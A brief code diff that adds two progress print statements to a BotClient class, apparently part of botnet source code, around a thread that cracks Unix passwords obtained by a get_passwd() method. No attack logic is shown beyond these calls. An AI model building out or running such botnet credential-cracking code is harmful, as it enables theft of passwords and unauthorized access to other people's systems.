@@ -220,11 +220,13 @@ class BotClient:
             return
 
         # 破解unix密码
+        print('[*] Start crack unix passwd.')
         t = threading.Thread(target=self.crack_passwd, args=(self.get_passwd(),))
 
         self.close()
         t.start()
         t.join()
+        print('[+] Crack passwd finished.')
 
 
 class BotNet:
